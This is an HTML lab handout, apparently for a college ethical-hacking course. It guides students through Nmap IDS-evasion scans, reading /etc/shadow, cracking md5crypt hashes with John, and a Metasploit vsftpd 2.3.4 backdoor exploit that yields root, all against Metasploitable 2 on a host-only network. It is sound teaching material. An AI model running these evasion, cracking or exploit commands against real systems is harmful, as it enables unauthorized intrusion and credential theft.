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" alt="Focus College logo"><span class="wk">Week 5 Lab</span></div>
+<div class="eb">Ethical Hacking (ETH-201) &middot; Focus College &middot; Fall 2026 &middot; Instructor: Arpan Bhavsar</div>
+<h1>Week 5 Lab &mdash; System Hacking: Evasion &amp; Gaining Access (Project Phase 3a)</h1>
+<p>Interleaved with this afternoon's lecture. We scan Metasploitable 2 past the alarm with Nmap evasion options, read where Linux keeps its credentials, crack a real md5crypt hash with John, prove that a salt beats a rainbow table but not a dictionary, and gain a root session via the vsftpd 2.3.4 backdoor &mdash; all on a host-only lab, inside scope. Parts are labelled <em>Do together after Section N</em>.</p>
+<div class="meta"><span>Target: Metasploitable 2 (host-only) + Kali</span><span>Free tools only</span><span>week5-lab-assets-student.zip</span><span>Phase 3a evidence</span></div>
+</div></header>
+<div class="wrap">
+<nav><b>Lab parts</b>
+<a href="#start">Before you start<span></span></a>
+<a href="#p0">Part 0 &mdash; Setup<span></span></a>
+<a href="#p1">Part 1 &mdash; Evasion<span>after Sec 1</span></a>
+<a href="#p2">Part 2 &mdash; Credentials<span>after Sec 2</span></a>
+<a href="#p3">Part 3 &mdash; Methodology<span>after Sec 3</span></a>
+<a href="#p4">Part 4 &mdash; Cracking<span>after Sec 4</span></a>
+<a href="#p5">Part 5 &mdash; Gaining access<span>after Sec 5</span></a>
+<a href="#p3a">Phase 3a wrap<span></span></a>
+<a href="#resources">Resources<span></span></a>
+<div class="tools"><button onclick="all_(true)">Show all solutions</button><button onclick="all_(false)">Hide all solutions</button></div></nav>
+<main>
+
+<div class="card" id="start"><h2>Before you start</h2>
+<ul>
+<li><b>How class runs:</b> after each lecture section we do the matching lab part together, labelled <em>Do together after Section N</em>. Keep the command-along page open too &mdash; it has the predict &rarr; run &rarr; read rhythm for every step here.</li>
+<li><b>Get the zip:</b> download <code>week5-lab-assets-student.zip</code> and unzip it next to this file so <code>lab-assets/</code> paths resolve.</li>
+<li><b>Primary target:</b> live Metasploitable 2 + Kali on a <b>host-only</b> network, never bridged. Fallback files in the zip are for students with no VM and are clearly labelled <em>fallback only</em>.</li>
+<li><b>Set your shortcut:</b> <code>MS2=&lt;your Metasploitable 2 IP&gt;</code> (often 192.168.56.101/102). We reuse <code>$MS2</code> throughout.</li>
+<li><b>Ethics:</b> host-only / lab targets only &mdash; never a college, workplace, classmate, or any real network. <b>Evasion lowers detection, not the need for authorization</b> &mdash; a quiet unauthorized scan is still illegal.</li>
+</ul>
+<div class="warn"><b>Never bridge Metasploitable 2.</b> It is deliberately vulnerable and would be compromised within minutes on the open internet. Keep it host-only and pause your VMs when done.</div>
+</div>
+
+<div class="part" id="p0"><div class="phead"><h2>Part 0 &mdash; Setup</h2></div>
+<div class="goal"><b>Goal:</b> both VMs up on one host-only network, and you know each address.</div>
+<div class="lbl">Do this</div>
+<pre>ip a                         # on Kali: note your address, e.g. 192.168.56.101
+sudo nmap -sn 192.168.56.0/24   # find Metasploitable 2 on the same /24
+MS2=192.168.56.102           # set the shortcut to the address you found</pre>
+<div class="lbl">What you should see</div>
+<pre class="out">Nmap scan report for 192.168.56.102
+Host is up.</pre>
+<div class="lbl">What it means</div>
+<div class="explain">You now have the attacker IP (Kali) and the target IP (Metasploitable 2). Substitute <code>$MS2</code> throughout. <b>No VM?</b> Read the <code>lab-assets/sample-output/</code> transcripts as the labelled fallback.</div>
+</div>
+
+<div class="part" id="p1"><div class="phead"><h2>Part 1 &mdash; Evasion</h2></div>
+<div class="together">Do together after Section 1 (IDS / firewall / honeypot evasion)</div>
+<div class="goal"><b>Goal:</b> run four scans with different evasion options and confirm they return the SAME open ports &mdash; evasion changes the profile, not the result.</div>
+
+<div class="task"><h3>1.1 &mdash; Baseline, fragment, decoy, source-port</h3>
+<div class="lbl">Do this (exact commands)</div>
+<pre>sudo nmap -sS -Pn -p 21,22,80,445 $MS2                       # baseline
+sudo nmap -sS -Pn -f -p 21,22,80,445 $MS2                    # fragment the TCP header
+sudo nmap -sS -Pn -D RND:4 -p 21,22,80,445 $MS2             # 4 decoy source addresses
+sudo nmap -sS -Pn --source-port 53 -T2 -p 21,22,80,445 $MS2 # trusted source port + polite timing</pre>
+<div class="lbl">What each part means</div>
+<div class="explain"><code>-sS</code> half-open SYN scan &middot; <code>-Pn</code> skip host discovery &middot; <code>-p</code> port list &middot; <code>-f</code> 8-byte fragments (beats signature engines) &middot; <code>-D RND:4</code> four forged decoys (beats attribution) &middot; <code>--source-port 53</code> pose as DNS (beats a weak firewall rule) &middot; <code>-T2</code> polite/slow timing (beats rate alarms).</div>
+<div class="lbl">What you should see (expected on live MS2)</div>
+<pre class="out">21/tcp  open  ftp
+22/tcp  open  ssh
+80/tcp  open  http
+445/tcp open  microsoft-ds
+# identical across all four scans</pre>
+<div class="lbl">What it means</div>
+<div class="explain">Our lab has no IDS, so all four succeed &mdash; that is the point: the evaded scans still land while looking different on the wire. On a defended network the plain scan is the one that would be flagged.</div>
+<button class="solbtn" onclick="tog('s11')">Show / hide solution</button><div class="sol" id="s11"><b>Checkpoint:</b> open Wireshark/tcpdump during the <code>-f</code> scan and confirm tiny IP fragments. Drop <code>-f</code> first if a firewall reassembles fragments. Full transcript: <code>lab-assets/sample-output/nmap-evasion.txt</code>.</div>
+</div></div>
+
+<div class="part" id="p2"><div class="phead"><h2>Part 2 &mdash; Credential stores</h2></div>
+<div class="together">Do together after Section 2 (Windows &amp; Linux security architecture)</div>
+<div class="goal"><b>Goal:</b> see where Linux keeps account names vs hashes, and read one hash field by field.</div>
+
+<div class="task"><h3>2.1 &mdash; passwd, shadow, SUID</h3>
+<div class="lbl">Do this (exact commands)</div>
+<pre>cat /etc/passwd | head        # world-readable account list ('x' = hash is elsewhere)
+cat /etc/shadow               # root only: the hashes
+ls -l /usr/bin/passwd         # note the SUID 's' bit</pre>
+<div class="lbl">What each part means</div>
+<div class="explain"><code>cat</code> prints a file &middot; <code>/etc/passwd</code> names + UIDs (UID 0 = root) &middot; <code>/etc/shadow</code> the <code>$id$salt$hash</code> entries &middot; <code>ls -l</code> shows permission bits; the <code>s</code> on passwd is the Set-User-ID bit.</div>
+<div class="lbl">What you should see</div>
+<pre class="out">msfadmin:$1$msfadmin$rhyK715KFaBMnilXFzf10/:19000:0:99999:7:::
+-rwsr-xr-x 1 root root ... /usr/bin/passwd</pre>
+<div class="lbl">What it means</div>
+<div class="explain">The hash lives in shadow, not passwd. <code>$1$</code> = md5crypt; <code>msfadmin</code> = salt; the long chunk = hash. The SUID <code>s</code> is why a normal user can change their own password. Copy <code>/etc/shadow</code> into your evidence folder for Part 4.</div>
+<button class="solbtn" onclick="tog('s21')">Show / hide solution</button><div class="sol" id="s21"><b>Field map:</b> username : <code>$id$</code> (algorithm) <code>$salt$</code> <code>hash</code> : lastchange : min : max : warn : : :. For sha512 the id is <code>$6$</code>. Fallback: <code>lab-assets/sample-output/shadow-cat.txt</code>, <code>passwd-ls.txt</code>.</div>
+</div></div>
+
+<div class="part" id="p3"><div class="phead"><h2>Part 3 &mdash; Methodology map</h2></div>
+<div class="together">Do together after Section 3 (CEH system-hacking methodology)</div>
+<div class="goal"><b>Goal:</b> place today's actions into the four system-hacking stages and the five phases (no new commands &mdash; a 5-minute reasoning task).</div>
+<div class="task"><h3>3.1 &mdash; Which stage, which phase?</h3>
+<div class="lbl">Do this</div>
+<p>For each action, write the stage (gain access / escalate / maintain / clear tracks) and the CEH phase:</p>
+<ol>
+<li>You exploit the vsftpd backdoor and land a shell.</li>
+<li>You abuse a SUID-root binary to go from a normal user to root.</li>
+<li>You add a hidden admin account to survive a reboot.</li>
+<li>You clear <code>/var/log/auth.log</code>.</li>
+</ol>
+<button class="solbtn" onclick="tog('s31')">Show / hide solution</button><div class="sol" id="s31">1 = gain access (Phase 3); 2 = escalate privileges (Phase 3); 3 = maintain access (Phase 4); 4 = clear tracks (Phase 5). Gaining access and escalation are both Phase 3. An ethical hacker documents what could be cleared rather than destroying the client&rsquo;s logs.</div>
+</div></div>
+
+<div class="part" id="p4"><div class="phead"><h2>Part 4 &mdash; Password cracking &amp; rainbow tables</h2></div>
+<div class="together">Do together after Section 4 (cracking mechanism &amp; rainbow tables)</div>
+<div class="goal"><b>Goal:</b> crack a real md5crypt hash with John, then prove a salt beats a rainbow table but not a dictionary.</div>
+
+<div class="task"><h3>4.1 &mdash; Crack the Metasploitable 2 hashes</h3>
+<div class="lbl">Do this (exact commands)</div>
+<pre>cp /etc/shadow ~/eth-evidence/shadow.txt       # or use lab-assets/shadow.txt
+john --format=md5crypt --wordlist=/usr/share/wordlists/rockyou.txt shadow.txt
+john --show shadow.txt</pre>
+<div class="lbl">What each part means</div>
+<div class="explain"><code>john</code> the cracker &middot; <code>--format=md5crypt</code> these are <code>$1$</code> hashes &middot; <code>--wordlist=</code> the dictionary of candidates &middot; <code>shadow.txt</code> the hashes &middot; <code>--show</code> prints what was recovered (from john.pot).</div>
+<div class="lbl">What you should see (VERIFIED recovered values)</div>
+<pre class="out">msfadmin:msfadmin
+user:user
+postgres:postgres
+service:service
+sys:batman
+klog:123456789
+6 password hashes cracked, 0 left</pre>
+<div class="lbl">What it means</div>
+<div class="explain">Every hash fell because the password was a weak, guessable word &mdash; not because md5crypt was broken. A long random password would have survived. In class, use rockyou.txt; with <code>lab-assets/lab-wordlist.txt</code> all six fall in under a second.</div>
+<button class="solbtn" onclick="tog('s41')">Show / hide solution</button><div class="sol" id="s41">The hashes are salted, yet John cracks them because a dictionary attack re-hashes each candidate <b>with the salt</b> (read from the file). A salt only defeats a <b>pre-computed rainbow table</b>. Hashcat equivalent: <code>hashcat -m 500 -a 0 shadow.txt rockyou.txt</code>. Fallback: <code>lab-assets/sample-output/john-crack.txt</code>.</div>
+</div>
+
+<div class="task"><h3>4.2 &mdash; Same password, different salt (rainbow-table proof)</h3>
+<div class="lbl">Do this</div>
+<pre>cat lab-assets/salt-demo.txt
+# alice and bob BOTH chose "password123" but have different salts.</pre>
+<div class="lbl">What you should see</div>
+<pre class="out">alice:$1$Ab12Cd34$GwACh5Hxr.JAfRKgn7d9J0:...
+bob:$1$Zz99Yy88$uYexDlgxuiAyQsFcWegJR0:...</pre>
+<div class="lbl">What it means</div>
+<div class="explain">Identical password, different salt &rarr; completely different hash. A rainbow table built for un-salted MD5 matches <b>neither</b>. But a dictionary attack cracks both, because it re-hashes "password123" with each salt. <b>A salt defeats pre-computation, not weak passwords.</b></div>
+<button class="solbtn" onclick="tog('s42')">Show / hide solution</button><div class="sol" id="s42">Why different: md5crypt mixes the salt in before hashing. Rainbow table: will NOT work (no salt+password chains; you&rsquo;d need one table per salt). What cracks it: a dictionary attack with John/Hashcat. Fix for weak passwords = length + unpredictability, not just a salt.</div>
+</div></div>
+
+<div class="part" id="p5"><div class="phead"><h2>Part 5 &mdash; Gaining access</h2></div>
+<div class="together">Do together after Section 5 (Metasploit &mdash; gaining access)</div>
+<div class="goal"><b>Goal:</b> turn one real vulnerability (CVE-2011-2523) into a root session, framed as CEH Phase 3.</div>
+
+<div class="task"><h3>5.1 &mdash; vsftpd 2.3.4 backdoor</h3>
+<div class="lbl">Do this (exact commands)</div>
+<pre>msfconsole -q
+search vsftpd
+use exploit/unix/ftp/vsftpd_234_backdoor
+set RHOSTS $MS2
+run
+id ; hostname ; uname -a      # inside the session: proof of access</pre>
+<div class="lbl">What each part means</div>
+<div class="explain"><code>search</code> finds the module &middot; <code>use</code> loads it &middot; <code>set RHOSTS</code> the target &middot; <code>run</code> fires it. No <code>set PAYLOAD</code> &mdash; the backdoor opens its own root shell on TCP 6200. <code>id</code>/<code>hostname</code>/<code>uname -a</code> are your proof.</div>
+<div class="lbl">What you should see</div>
+<pre class="out">[+] UID: uid=0(root) gid=0(root)
+[*] Command shell session 1 opened
+uid=0(root) gid=0(root)</pre>
+<div class="lbl">What it means</div>
+<div class="explain">Vulnerability = CVE-2011-2523; exploit = the module; session = your root shell = <b>gaining access, Phase 3</b>. From here you could <code>cat /etc/shadow</code> (closing the loop with Part 4). Capture proof, then stop &mdash; gain access and prove it, do not damage the box.</div>
+<button class="solbtn" onclick="tog('s51')">Show / hide solution</button><div class="sol" id="s51">No payload was needed because the backdoor carries its own shell. Today&rsquo;s framing (CEH gaining-access phase + vocabulary) differs from the Friday engagement framing (minimum proof for a client report). Fallback: <code>lab-assets/sample-output/vsftpd-exploit.txt</code>.</div>
+</div></div>
+
+<div class="part" id="p3a"><div class="phead"><h2>Phase 3a wrap</h2></div>
+<div class="goal"><b>Goal:</b> assemble your evidence file. No new assignment this week &mdash; Week 6 is the midterm.</div>
+<div class="explain">Fill in <code>lab-assets/templates/phase3a-evidence-template.md</code> with: your four evasion scans, the shadow line you read (id + salt), your John results and why the salt didn&rsquo;t stop them, and your vsftpd session proof (id/hostname/uname -a). If you used a fallback for any part, say so.</div>
+<div class="note">Deadlines in this course are written as &ldquo;before midnight PT&rdquo;. Nothing new is due from today; keep building Phase 3a evidence and review Weeks 1&ndash;5 for the midterm.</div>
+</div>
+
+<div class="card" id="resources"><h2>Resources</h2>
+<ul>
+<li><a href="https://nmap.org/book/man-bypass-firewalls-ids.html">Nmap &mdash; Firewall/IDS Evasion and Spoofing</a> (the evasion flags)</li>
+<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2011-2523">NVD &mdash; CVE-2011-2523</a> (vsftpd 2.3.4 backdoor, CVSS 9.8)</li>
+<li><a href="https://manpages.debian.org/unstable/libcrypt-dev/crypt.5.en.html">Linux crypt(5)</a> (shadow hash id prefixes)</li>
+<li><a href="https://link.springer.com/content/pdf/10.1007/978-3-540-45146-4_36.pdf">Oechslin (2003)</a> &mdash; rainbow tables (time-memory trade-off)</li>
+<li><a href="https://www.eccouncil.org/cybersecurity-exchange/ethical-hacking/ceh-learning-framework/">EC-Council CEH &mdash; five phases</a></li>
+<li>Lab files: <code>week5-lab-assets-student.zip</code> &rarr; unzip to <code>lab-assets/</code></li>
+</ul>
+</div>
+
+</main></div>
+<script>
+function tog(id){document.getElementById(id).classList.toggle('on');}
+function all_(on){document.querySelectorAll('.sol').forEach(function(s){s.classList.toggle('on',on);});}
+</script>
+</body></html>
